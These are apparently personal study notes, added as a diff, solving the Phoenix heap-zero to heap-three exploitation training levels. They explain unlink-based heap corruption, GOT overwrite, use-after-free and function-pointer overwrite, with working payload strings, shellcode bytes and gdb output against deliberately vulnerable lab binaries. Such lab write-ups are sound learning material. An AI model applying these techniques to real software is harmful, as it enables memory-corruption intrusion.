@@ -1,0 +1,281 @@
+###########
+Heap 3  
+###########
+https://www.youtube.com/watch?v=HWhzH--89UQ
+
+If chunks are bigger than fastbins (over 80 bytes), then they are double linked. Both fd and bk (forward and back) pointers are used.
+
+Scenario:
+There is a chunk we want to free, which is followed by an already free double-linked chunk.
+
+The free() algo will merge the two chunks together. It will begin by first unlinking the second chunk using the unlink() macro.
+
+# unlink
+
+A free chunk has a forward pointer to the next free bin, and a backward pointer to the previous free bin.
+
+So it unlinks itself by connecting the previous bin to the next fin. It writes his fd to the previous bin's fd and his bk to the next bin's bk.
+
+Note that the chunk knows the locations of the next and previous bin by looking at his fd and bk.
+
+# /unlink
+
+So if you control a chunk's fd and bk, then you can control where stuff is written.
+
+For example, if the fd is the location of a GOT entry, then bk will be written into [fd]. So if bk is a pointer to a function you control, then you're golden.
+
+# caveat
+
+Note that not only will bk be written into [fd], but fd will also be written into [bk]. So, for exploitation purposes, bk has to be a pointer to a writeable location. For example, a pointer to the heap.
+
+# /caveat
+
+
+After unlink() has completed, the two chunks will be merged together. The first chunk's size is increased, and the fd and bk pointers are set for the chunk.
+
+# strcpy and NULL byte
+
+strcpy() can't write NULL bytes, since a string ends with a NULL byte. If we want to avoid having to write null bytes, then we can use a neat trick - adding 0xfffffffc is the same as subtracting 4, due to integer overflow. So therefore if we need to write some small values, then we can instead use large ones. 
+
+This is useful in the calculation of the location of the next chunk. 
+next_chunk_address = current_chunk_address + chunk_size
+
+if chunk_size is a very large number, then it will overflow and the next chunk address will be lower than the current chunk address. And we will not have to write any NULL bytes.
+
+# /strcpy and NULL byte
+
+# unlink trigger conditions and desired address values
+
+So, unlink() will be triggered if:
+* the chunk is free
+  * checked by checking the "size" field of the next chunk and checking if the PREV_INUSE bit is set. The address of the next chunk is calculated by doing: address_of_next_chunk = address_of_this_chunk + chunk_size
+* the previous chunk is free
+  * Checked by checking the PREV_INUSE bit of the "size" field.
+
+Therefore, here's something you can do:
+
+You can set the "size" field of the current chunk to 0xfffffffc.
+  * says that previous chunk is free
+  * says that next chunk is at chunk_address - 4
+You can set the "size" field of the next chunk to 0xfffffffc.
+  * says that the current chunk is free
+  * the address where you have to change the next chunk's "size" fields is 4 bytes (1 word) before the current chunk's "size" field.
+
+So, the chunk you want to unlink will look like this:
+0xfffffffc        0xfffffffc          fd             bk
+     |                 |              |              |
+size of next chunk  size of chunk  fwd pointer     backw pointer
+
+# / unlink trigger conditions and desired address values
+
+# overall heap values for exploit
+
+So, as mentioned, you want the freed chunk (which will be the second of the three free()'s, and the second of the three chunks) to be over 80 bytes long. So the first strcpy will be used to write 0x65 to the size field (100 bytes + PREV_INUSE).
+
+Then, another strcpy could be used to write the third chunk, which will be unlinked. As explained before, size is 0xfffffffc, the byte before that is 0xfffffffc and then fd and bk after that.
+
+# bk and fd values and considerations
+
+bk will contain the pointer to some shellcode on the heap. Note that that area will get fd written to it as well, so our exploit needs to either be short or to jump over the "destroyed" area where fd is written. Since we just want to call winner(), then that's very short.
+
+# exploitation - second parameter
+
+echo -ne "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\x65" > /home/user/heap/B
+
+then, in GDB:
+
+r AAAA `cat /home/user/heap/B` CCCC
+
+and the size is overwritten to 0x65 correctly.
+
+# exploitation - third param
+
+## getting the GOT entry
+
+disas main
+   0x080488b7 <+187>:	call   0x80485b0 <puts@plt>
+
+x/1i 0x80485b0
+   0x80485b0 <puts@plt>:	jmp    DWORD PTR ds:0x804c13c
+
+(gdb) x/1w 0x804c13c
+0x804c13c <puts@got.plt>:	0xf7fb88ee
+
+We can see that the puts function starts at 0xf7fb88ee. The GOT entry which contains the location of the puts function is  0x804c13c.
+
+We will subtract 12 from it. This is because 12 will be added by the algorithm (because the fd and bk fields are not at the start of the chunk. the prev_size field and size fields come before them.
+
+(gdb) x 0x804c13c - 12
+   0x804c130 <printf@got.plt>:	test   DWORD PTR [edi+0x40f5f7fb],eax
+
+Therefore, fd's value will be 0x804c130.
+
+We will set the value of bk to be 0xf7e69008, which is an address on the heap. EXCEPT we can't, because that address contains a null byte. So how about using 0xf7e69010 instead.
+
+## Writing the initial payload.
+I used python to print ~100 C's as that's how much were needed. I think the total amount of C's was 92. After that I put the 2 0xfffffffc's. After that I put the GOT entry - 12. And after that I put the heap address.
+
+echo -en "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\xfc\xff\xff\xff\xfc\xff\xff\xff\x30\xc1\x04\x08\x10\x90\xe6\xf7" > C
+
+## Writing the shellcode
+
+Next, we need shellcode that will call the winner() function. 
+https://defuse.ca/online-x86-assembler.htm
+Assembly:
+mov eax, 0x080487d5
+call eax
+
+We got the address of winner() by doing objdump
+user@phoenix-amd64:/opt/phoenix/i486$ objdump heap-three -t | grep winner
+080487d5 g     F .text	00000027 winner
+
+We get the shellcode:
+\xB8\xD5\x87\x04\x08\xFF\xD0
+
+echo -en "\xB8\xD5\x87\x04\x08\xFF\xD0" > A
+
+We will probably also need to add some padding to the beginning
+
+Let's add some "mov eax, eax" instructions to function as a nopslide
+
+echo -en "\x89\xC0\x89\xC0\x89\xC0\x89\xC0\x89\xC0\x89\xC0\x89\xC0\xB8\xD5\x87\x04\x08\xFF\xD0" > A
+
+The shit works, the GOT gets overwritten and we go into the heap. However, it looks like heap+12 is written to and corrupted. 
+
+Original:
+0xf7e69000:	0x00000000	0x00000029	0xc089c089	0xc089c089
+0xf7e69010:	0xc089c089	0xd5b8c089	0xff080487	0x000000d0
+
+After the free()'s:
+0xf7e69000:	0x00000000	0x00000029	0xf7e69028	0xc089c089
+0xf7e69010:	0xc089c089	0xd5b8c089	0x0804c130	0x000000d0
+
+
+## Fixing the exploit
+
+We actually land on the "mov eax, eax"'s. So all we need to do is have less of them before the call.
+
+We land at 0xf7e69010. Meaning the payload can actually be simplified to:
+echo -en "AAAAAAAA\xB8\xD5\x87\x04\x08\xFF\xD0" > A
+
+After that, everything is flawless.
+
+user@phoenix-amd64:/opt/phoenix/i486$ ./heap-three $(cat ~/heap/A) $(cat ~/heap/B) $(cat ~/heap/C)
+Level was successfully completed at @ 1601558053 seconds past the Epoch
+Segmentation fault
+
+
+#####################################
+Trying to understand the heap better #
+######################################
+Follow along with liveoverflow's video:
+https://www.youtube.com/watch?v=gL45bjQvZSU
+
+Using GDB because the radare2 in phoenix there sucks
+
+gdb ./heap-three
+r AAAAAAAAAAAA BBBBBBBBBBBB CCCCCCCCCCCC
+
+
+Find out where the heap is:
+info proc mappings
+It's at 0xf7e69000
+
+Let's define a hook stop which runs code after every breakpoint. It will print the contents of the heap (60 hex words).
+define hook-stop
+x/60wx 0xf7e69000
+end
+
+I didn't understand that video. but the next video seems better.
+
+#########
+Heap 2
+########
+Solution:
+
+[ auth = 0, service = 0 ]
+auth admin
+[ auth = 0x8049af0, service = 0 ]
+reset
+[ auth = 0x8049af0, service = 0 ]
+service aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+[ auth = 0x8049af0, service = 0x8049af0 ]
+login
+you have logged in already!
+
+
+Explanation:
+You allocate space for the auth variable on the heap. The “auth” variable will point to the location of the allocated space on the heap. Then you free that space. However, the variable is not nulled and it will still point to a freed space on the heap.
+
+The 'service' command calls malloc() behind the scenes (allocates space on the heap) and writes to the allocated space.
+
+This space will be allocated to the same spot that was freed earlier. And data will be written there. The auth variable still points to that spot, so you're effectively overwriting the contents of auth.
+
+By specifying a long string ("aaaaaaaaaa...") you're overwriting the 32 byte buffer of "name" and overwriting "auth".
+Thus, the application thinks you're logged in.
+
+################
+Heap 1
+###############
+user@phoenix-amd64:/opt/phoenix/i486$ objdump -t heap-one  | grep winner
+0804889a g     F .text	00000027 winner
+
+
+Heap state before the write:
+
+0xf7e69000  0x00000000 # chunk header first part 
+0xf7e69004  0x00000011 # chunk second part. 0x8 bytes malloc + 0x8 bytes header + 0x1 byte for the previous chunk being used = 0x11 
+0xf7e69008  0x00000001 # struct1.priority = 1
+0xf7e6900c  0xf7e69018 # *struct1.name
+0xf7e69010  0x00000000  
+0xf7e69014  0x00000011  
+0xf7e69018  0x00000000 # struct1.name. Strcpy into this part 
+0xf7e6901c  0x00000000  
+0xf7e69020  0x00000000  
+0xf7e69024  0x00000011  
+0xf7e69028  0x00000002  
+0xf7e6902c  0xf7e69038 # *struct2.name. This address will be written to. We can overwrite this with the GOT address
+0xf7e69030  0x00000000  
+0xf7e69034  0x00000011  
+0xf7e69038  0x00000000  
+0xf7e6903c  0x00000000  
+0xf7e69040  0x00000000  
+0xf7e69044  0x000fffc1  
+
+PLT entry: jmp dword [reloc.puts_64]
+Value of reloc.puts_64 - 0x0804c140
+
+We need to write 0x0804889a (winner) to 0x0804c140 (reloc.puts_64)
+
+doo AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK 000011112222333344445555
+create a segfault and see what we need to write where.
+
+strcpy will try to write to the address 0x46464646  FFFF
+Therefore the payload will be 
+
+./heap-one "$(echo -n -e 'AAAABBBBCCCCDDDDEEEE\x40\xc1\x04\x08')" $(echo -n -e '\x9a\x88\x04\x08')
+
+Btw radare2 is having trouble passing non-ascii bytes to the program as program arguments. It's throwing an error:
+
+INValid fd
+USING 0
+Cannot open '��U��' for writing
+
+which sucks and makes debugging more complicated. I guess you couldpass some ascii value and then change it in memory when you run the program.
+
+################
+Heap 0
+###############
+user@phoenix-amd64:/opt/phoenix/i486$ objdump -t heap-zero  | grep winner
+0804884e g     F .text	00000019 nowinner
+08048835 g     F .text	00000019 winner
+
+user@phoenix-amd64:/opt/phoenix/i486$ ./heap-zero  AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS
+Welcome to phoenix/heap-zero, brought to you by https://exploit.education
+data is at 0xf7e69008, fp is at 0xf7e69050, will be calling 0x53535353
+Segmentation fault
+
+The SSSS will be the function pointer called
+
+./heap-zero "$(echo -n -e 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR\x35\x88\x04\x08')"
+will be a correct payload to passing the level.
